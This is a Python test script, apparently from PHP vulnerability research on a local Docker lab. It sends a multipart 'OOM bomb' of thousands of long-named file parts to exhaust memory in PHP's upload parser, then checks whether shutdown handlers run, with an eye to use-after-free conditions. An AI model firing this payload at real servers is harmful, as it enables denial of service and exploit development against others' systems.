#!/usr/bin/env python3
"""
Chain D Verification Part 2: Does php_request_shutdown() fire after OOM?

Tests whether auto_prepend_file's shutdown function fires during an OOM
request, and what error state it sees.

Key question: Does OOM in rfc1867_post_handler() (during sapi_activate())
fire BEFORE or AFTER auto_prepend_file runs?

If BEFORE: auto_prepend never executes → no user shutdown functions registered
           → shutdown still runs but only PHP internal cleanup
If AFTER:  auto_prepend ran → shutdown function fires → we can see error state

This tells us at which lifecycle point rfc1867 OOM occurs.
"""

import argparse
import socket
import sys
import time


def http_get(host, port, path, timeout=10):
    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req.encode())
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get_body(resp):
    if b"\r\n\r\n" in resp:
        return resp.split(b"\r\n\r\n", 1)[1].decode("latin1", "replace")
    return ""


def send_oom(host, port, path, num_files=16000, fname_size=500, timeout=60):
    boundary = "CHAIND_SHUTDOWN_TEST"
    parts = []
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * (fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"X\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts).encode("latin1")

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=timeout)
    sent = 0
    while sent < len(req):
        s.sendall(req[sent:sent + 65536])
        sent += len(req[sent:sent + 65536])
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def read_container_file(path):
    import subprocess
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "cat", path],
        capture_output=True, text=True, timeout=5)
    return r.stdout if r.returncode == 0 else ""


def clear_container_files(*paths):
    import subprocess
    for p in paths:
        subprocess.run(
            ["docker", "exec", "php2shell-apache", "rm", "-f", p],
            capture_output=True, timeout=5)


def main():
    ap = argparse.ArgumentParser(
        description="Chain D: Verify shutdown behavior during OOM")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18081)
    ap.add_argument("--num-files", type=int, default=16000)
    ap.add_argument("--fname-size", type=int, default=500)
    args = ap.parse_args()

    prepend_log = "/tmp/chain_d_prepend.log"
    shutdown_log = "/tmp/chain_d_shutdown_prepend.log"

    print("=" * 70)
    print("  Chain D: OOM Shutdown Behavior Verification")
    print("=" * 70)
    print()

    # ── Step 1: Clear logs ────────────────────────────────────────────
    print("[1] Clearing logs...")
    clear_container_files(prepend_log, shutdown_log)
    print("    OK")

    # ── Step 2: Normal request baseline ───────────────────────────────
    print("\n[2] Normal request (baseline)...")
    resp = http_get(args.host, args.port, "/index.php")
    body = get_body(resp)
    print(f"    Response: {body.strip()[:80]}")

    time.sleep(0.3)
    prepend = read_container_file(prepend_log)
    shutdown = read_container_file(shutdown_log)
    prepend_count_before = prepend.count("PREPEND_START")
    shutdown_count_before = shutdown.count("SHUTDOWN_FROM_PREPEND")
    print(f"    Prepend fired: {prepend_count_before}")
    print(f"    Shutdown fired: {shutdown_count_before}")

    # ── Step 3: Clear logs, send OOM ──────────────────────────────────
    print("\n[3] Clearing logs before OOM...")
    clear_container_files(prepend_log, shutdown_log)

    print(f"\n[4] Sending OOM bomb to /index.php ({args.num_files} files)...")
    oom_resp = send_oom(args.host, args.port, "/index.php",
                        num_files=args.num_files,
                        fname_size=args.fname_size)

    if oom_resp:
        status = oom_resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        oom_body = get_body(oom_resp)
        print(f"    Status: {status}")
        if "Fatal error" in oom_body or "Allowed memory" in oom_body:
            idx = oom_body.find("tried to allocate")
            if idx >= 0:
                print(f"    OOM: {oom_body[idx:idx+80]}")
            else:
                print("    OOM: Fatal error detected")
    else:
        print("    No response (worker crashed)")

    # ── Step 4: Read logs ─────────────────────────────────────────────
    print(f"\n[5] Reading logs from OOM request...")
    time.sleep(0.5)

    prepend = read_container_file(prepend_log)
    shutdown = read_container_file(shutdown_log)

    prepend_count = prepend.count("PREPEND_START")
    shutdown_count = shutdown.count("SHUTDOWN_FROM_PREPEND")

    print(f"    auto_prepend_file executed: {'YES' if prepend_count > 0 else 'NO'}")
    print(f"    Shutdown function fired: {'YES' if shutdown_count > 0 else 'NO'}")

    if prepend:
        print(f"\n    prepend.log:")
        for line in prepend.strip().split("\n"):
            print(f"      {line}")
    if shutdown:
        print(f"\n    shutdown.log:")
        for line in shutdown.strip().split("\n"):
            print(f"      {line}")

    # ── Step 5: Test with nosession.php (no session_start) ────────────
    print(f"\n[6] Clearing logs for nosession.php test...")
    clear_container_files(prepend_log, shutdown_log)

    print(f"\n[7] Sending OOM bomb to /nosession.php...")
    oom_resp2 = send_oom(args.host, args.port, "/nosession.php",
                         num_files=args.num_files,
                         fname_size=args.fname_size)
    if oom_resp2:
        status2 = oom_resp2.split(b"\r\n", 1)[0].decode("latin1", "replace")
        print(f"    Status: {status2}")
    else:
        print("    No response")

    time.sleep(0.5)
    prepend2 = read_container_file(prepend_log)
    shutdown2 = read_container_file(shutdown_log)

    print(f"    auto_prepend_file executed: {'YES' if 'PREPEND_START' in prepend2 else 'NO'}")
    print(f"    Shutdown function fired: {'YES' if 'SHUTDOWN_FROM_PREPEND' in shutdown2 else 'NO'}")
    if shutdown2:
        print(f"\n    shutdown.log:")
        for line in shutdown2.strip().split("\n"):
            print(f"      {line}")

    # ── Step 6: Verify worker still alive ─────────────────────────────
    print(f"\n[8] Verifying worker alive after OOM tests...")
    try:
        resp = http_get(args.host, args.port, "/index.php")
        body = get_body(resp)
        if "OK" in body:
            print("    Worker alive")
        else:
            print(f"    Unexpected: {body[:100]}")
    except Exception as e:
        print(f"    Worker dead: {e}")

    # ── Analysis ──────────────────────────────────────────────────────
    print()
    print("=" * 70)
    print("  ANALYSIS: OOM Lifecycle Point")
    print("=" * 70)

    if prepend_count == 0 and shutdown_count == 0:
        print()
        print("  auto_prepend_file did NOT execute during OOM request.")
        print("  This means OOM fires during sapi_activate() which is BEFORE")
        print("  the RINIT phase where auto_prepend_file and scripts execute.")
        print()
        print("  Request lifecycle for OOM:")
        print("    1. Apache receives POST request")
        print("    2. php_request_startup() begins")
        print("    3. sapi_activate() -> sapi_read_post_data()")
        print("    4. rfc1867_post_handler() starts parsing multipart body")
        print("    5. OOM fires inside parser allocation")
        print("    6. longjmp() to bailout handler")
        print("    7. php_request_shutdown() runs (internal cleanup only)")
        print("    8. Worker survives, ready for next request")
        print()
        print("  IMPLICATION: No user PHP code runs during OOM request.")
        print("  EG(objects_store) is EMPTY - no user objects to UAF.")
        print("  The shutdown walks only internal PHP structures (hash tables,")
        print("  partially-constructed $_FILES, etc.).")
    elif prepend_count > 0 and shutdown_count > 0:
        print()
        print("  auto_prepend_file DID execute during OOM request!")
        print("  Shutdown function DID fire!")
        print("  This means OOM fires AFTER RINIT - user code runs first.")
        print()
        if shutdown:
            print("  Shutdown saw this error state:")
            for line in shutdown.strip().split("\n"):
                print(f"    {line}")
    elif prepend_count > 0 and shutdown_count == 0:
        print()
        print("  auto_prepend_file executed but shutdown did NOT fire.")
        print("  The OOM killed the request so hard that even shutdown was skipped.")
        print("  This is the most dangerous case for UAF.")

    print()
    print("=" * 70)
    return 0


if __name__ == "__main__":
    sys.exit(main())
